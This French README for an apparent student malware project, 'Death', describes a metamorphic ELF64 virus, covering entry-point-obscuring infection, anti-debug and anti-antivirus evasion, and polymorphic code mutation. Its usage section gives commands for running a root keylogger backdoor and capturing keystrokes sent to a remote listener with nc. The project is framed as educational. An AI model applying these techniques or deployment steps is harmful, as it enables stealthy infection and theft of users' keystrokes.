# Death

[@arobion][arobion]
Sommaire:
```
  I	- Usage
  II	- Description
  III	- Fonctionement
        - Infection
          - Entry-Point Obscuring (EPO) technique
          - Insertion
        - Obfuscation
          - Anti debug
            - Anti breackpoint
            - Anti ptrace
            - Anti step by step
            - Section header obfuscation
            - Verification si un anti-virus
            - Close EPO
          - Polymorphisme
          - Metamorphisme
        - Backdoor
```
> ATTENTION : Ce projet est uniquement a **but pedagogique**.

## I - Usage

```shell
$> make
$> ./create.sh #cree le dossier /tmp/test1 et /tmp/test2, copie les binaires ls, python, bash de /bin
$> ./death #infecte les deux dossiers
$> ./check.sh	#verifie si il y a des binaires infecte dans /tmp/test1 et /tmp/test2
$> ./infect.sh	#copie /tmp/test1/ls -> ./infected, recree le dossier /tmp/test1 et /tmp/test2, copie les binaires ls, python, bash de /bin et les infectes a partie de ./infected

#pour l'utilisation de la backdoor:
#modifier l'adresse IP dans ./src_s/anti_data.s
#etre en root et lancer infected
$> sudo ./infected
#sur le poste qui a cette adresse IP lancer la commande
$> nc -l 5678 > keylogger.txt
#pour traduire les touches
$> python3 translate.py keylogger.txt
```

## II - Description

Ce projet est un virus metamorphique, qui est l'aboutissement de plusieurs projets:
- **WOODY-WOOPACKER**: Projet consistant a realiser un packer de elf64
- **FAMINE**: Projet consistant à cree un virus basique qui a pour but de simplement laisser une trace dans certains fichier contenu dans un dossier spécifique
- **PESTILENCE**: Projet consistant à cree un virus obfusqué
- **WAR**: Projet consistant à cree un virus polymorphique

## III - Fonctionement

### Infection:
  - **Entry-Point Obscuring (EPO) technique**:
  
    Cette technique d'infection consiste à ouvrir plusieurs portes dans le binaire infecté, en remplacant dans celui-ci les appels de certaines fonctions par un jump sur notre virus et d'y revenir ensuite à la fin de l'execution de notre virus.
    Pour ce faire nous avons decidé d'infecter un binaire si il a plus de 50 call valides. C'est a dire une fonction commencant par le prolog ou alors si elle fait partie de la GOT.
  - **Insertion**:
  
    Nous placons une partie de notre virus dans le padding de la section .text et le reste apres le .bss

### Obfuscation:

  #### Anti-debug:
  - **Anti breakpoint**:
      
      Voir la section Polymorphisme.
  
  - **Anti ptrace**:
      
      Au lancement de la routine d'infection sur un binaire infecte, nous creons un enfant avec la commande ```fork```.
      
      Dans cet enfant nous essayons d'attacher le parent avec commande ```ptrace```, si l'attachement ne fonctionne pas nous arretons la routine d'infection.
      
      Si l'attachement fonctionne, nous allons dans l'enfant faire excuter la partie hash du pere et recuperer cette valeur.
      
      Ensuite dans l'enfant on vas executer la partie dechiffrement, et nous alons faire jump le parent à la valeur obtenue.
  
  - **Anti step-by-step**:
      
      Vérification du Time-Stamp Counter grace à l'insctrution ```rdtsc```.
      
      Verification du RFLAGS TF grace à l'insctruction ```pushfq```.
      
  - **Section header obfuscation**:
  
      Nous corrompons la section header pour ne plus avoir d'information sur le binaire infecte.
      
  - **Verification si un anti-virus**:
  
      Nous recherchons si il y a un process avec le nom ```je sais plus```, si il est actif nous ne lancons pas notre virus.
      
  - **Close EPO**:
      
      Apres le premier passage dans notre virus nous refermons les EPO pour ne plus repasser dans notre virus jusqu'a la fin de l'execution du programme.
  
  #### Polymorphisme:
  
  #### Metamorphisme:
  
   Nous avons dispatché dans la partie du virus non polymorphique des placeholder.
    Nous les remplacons de maniere aleatoire à chaque infection ces placeholder par differentes instructions.
    
| Exemples d'instructions | | | | | | 
| ------ | ------ | ------ | ------ | ------ | ------ |
| push rax  | nop | inc rax | dec rax | nop | push rax |
| nop | push rax | dec rax | inc rax | nop | pop rax |
| nop | pop rax | . | . | push rax | nop |
| pop rax | nop | . | . | pop rax | nop |

### Backdoor:
  La backdoor est un keylogger qui envoi les touches sur une adresse IP renseigné dans ./srcs_s/anti_data.s sur le port 5678.




[arobion]: <https://github.com/arobion>
